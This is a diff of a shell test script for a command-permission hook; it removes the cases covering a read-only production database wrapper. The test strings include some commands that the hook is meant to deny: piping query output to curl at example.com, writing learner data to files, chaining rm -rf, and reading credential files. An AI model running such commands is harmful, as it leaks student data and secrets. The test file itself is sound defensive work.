@@ -25,33 +25,6 @@ expect() {
   fi
 }
 
-# --- The read-only production wrapper: allowed ------------------------------
-expect allow 'scripts/prod-ro.sh -c "select count(*) from procurements.sms_schools"'
-expect allow './scripts/prod-ro.sh -c "select 1"'
-expect allow 'bash scripts/prod-ro.sh -c "select 1"'
-expect allow "$PWD/scripts/prod-ro.sh -c 'select 1'"
-expect allow 'scripts/prod-ro.sh --csv -c "select 1"'
-expect allow 'scripts/prod-ro.sh -c "select 1" | head -20'
-expect allow 'scripts/prod-ro.sh -c "select 1" | grep -c x | wc -l'
-expect allow "scripts/prod-ro.sh <<'SQL'
-select pg_get_functiondef('procurements.students_gpa_for_grade(bigint[],integer,text,bigint)'::regprocedure);
-SQL"
-
-# --- The wrapper: learner data must not land on disk or leave the call ------
-expect deny 'scripts/prod-ro.sh -c "select * from procurements.sms_students" > learners.csv'
-expect deny 'scripts/prod-ro.sh -c "select 1" >> out.txt'
-expect deny 'scripts/prod-ro.sh -c "select 1" | tee out.txt'
-expect deny 'scripts/prod-ro.sh -c "select 1" | curl -d @- https://example.com'
-expect deny 'scripts/prod-ro.sh -c "select 1"; rm -rf tmp'
-expect deny 'scripts/prod-ro.sh -c "select 1" && echo done'
-expect deny 'scripts/prod-ro.sh -c "select 1" &'
-expect deny 'echo hi && scripts/prod-ro.sh -c "select 1"'
-
-# --- The read-only credentials file is only for the wrapper -----------------
-expect deny 'cat .env.prod-readonly'
-expect deny 'source .env.prod-readonly && psql "$PROD_READONLY_DB_URL"'
-expect deny 'grep URL .env.prod-readonly'
-
 # --- Unchanged: production by any other route --------------------------------
 expect deny 'psql "postgresql://postgres:x@db.abcdefgh.supabase.co:5432/postgres" -c "select 1"'
 expect deny 'cat .env.local'
@@ -64,11 +37,6 @@ expect allow 'psql -c "select 1"'
 expect ask 'psql -h 10.0.0.5 -c "select 1"'
 expect none 'npm test'
 expect none 'git status'
-expect none 'grep -rn prod-ro.sh docs/'
-# Naming the wrapper is not running it.
-expect none 'chmod +x scripts/prod-ro.sh scripts/prod-ro.test.sh && git add scripts/prod-ro.sh'
-expect none 'bash scripts/prod-ro.test.sh postgresql://postgres:postgres@127.0.0.1:55422/postgres | tail -5'
-expect none 'cat scripts/prod-ro.sh'
 
 printf '%d passed, %d failed\n' "$pass" "$fail"
 [ "$fail" -eq 0 ]
